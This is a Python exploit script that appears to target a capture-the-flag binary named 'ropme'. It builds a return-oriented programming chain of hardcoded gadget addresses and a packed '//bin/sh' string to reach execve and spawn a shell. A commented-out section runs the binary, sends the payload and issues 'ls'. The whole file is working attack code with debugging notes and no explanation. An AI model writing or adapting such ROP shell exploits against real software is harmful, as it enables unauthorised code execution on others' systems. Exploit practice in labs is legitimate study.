#!/usr/bin/env python

import struct
import subprocess as subp
import time

#0x7ffff7af1a60 <execve>
#break *0x7ffff7a57503
#Return PTR 0x7fffffffe238
#seg fault at 71 chars
#0x7ffff7af1a65 syscall
#return pointer points to exit
#execve at print execve

shellcode = "//bin/sh"
shellcode = shellcode[::-1]
shellcode = shellcode.encode('hex')
shellcode = int(shellcode,16)
roplist = []


roplist.append(shellcode) 
roplist.append(0x0000000000000000) #junk
roplist.append(0x4141414141414141) #junk
roplist.append(0x4141414141414141) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x00007ffff7aa3480) # xor edx, edx ; mov rax, rdx ;ret fgets+320
roplist.append(0x0000000000400627) #mov rbp,rsp ; sub rsp,0x50 ;mov DWORD PTR [rbp-0x44],edi
roplist.append(0x00000000004006d1) #pop rsi ; pop r15 ; ret
roplist.append(0x00000000004006d3) # pop rdi ; ret
roplist.append(0x0000000000400590) # pop rbp ; ret
roplist.append(0x00000000004006cb) #pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x0000000000000000) #junk
roplist.append(0x00000000004006d3) # pop rdi ; ret
roplist.append(0x0000000000000000) #junk
roplist.append(0x00000000004004c9) #ret
roplist.append(0x0000000000400590) # pop rbp ; ret
roplist.append(0x0000000000000000) #junk
#roplist.append(0x00007fffffffe140) # EXP env
#roplist.append(0x00007ffff7af4630) #mov eax, 0x3b (0x8509bc0 bytes away for stack position)
								   #0x00007ffff7af4635) #syscall
#roplist.append(0x00007ffff7a71980) #redirect to read <---- doesn't do anything. crashes
#roplist.append(0x00007ffff7aa3340) #junk
#roplist.append(0x0000000000400590) #pop RBP; ret
#roplist.append(0x00007fffffffe1c8) #original RBP								  
#roplist.append(0x000000000040066b) #redirect to read <---- doesn't do anything. crashes								   
#roplist.append(0x0000000000400666)

def x(roplist):

	struct_rop = [ (struct.pack('<Q',i)) for i in roplist]
	#struct_rop = [ i.replace("\\","\\\\") for i in struct_rop]
	#print struct_rop
	return ''.join(struct_rop)

print x(roplist)



# shellcode = "//bin/sh"
# shellcode = shellcode[::-1]
# shellcode = shellcode.encode('hex')
# shellcode = int(shellcode,16)
# roplist = []


# roplist.append(shellcode) 
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x0000000000000000) #junk
# roplist.append(0x00007ffff7aa3480) # xor edx, edx ; mov rax, rdx ;ret fgets+320
# roplist.append(0x00000000004006d3) #pop rdi ; ret
# roplist.append(0x00007fffffffe190) # EXP env
# roplist.append(0x00000000004006d1) #pop rsi ; pop r15 ; ret
# roplist.append(0x0000000000000000) # EXP env
# roplist.append(0x00007fffffffe190) # EXP env
# roplist.append(0x00007ffff7af4630) #mov eax, 0x3b (0x8509bc0 bytes away for stack position)
# 								   #0x00007ffff7af4635) #syscall
# # roplist.append(0x00007ffff7a71980) #redirect to read <---- doesn't do anything. cras

# proc = subp.Popen("./ropme", stdin=subp.PIPE, stdout=subp.PIPE)

# banner = "ROP me outside, how 'about dah?"
# output, error = proc.communicate()

# while True:

# 	if output.strip() == banner:
# 		print "[+] Sending payload..."
# 		proc.stdin.write(shh)
# 		time.sleep(3)
# 		proc.stdin.write("ls")
# 	if output == '' and proc.poll() is not None:
# 		break

# 	if output:
# 		print output.strip()


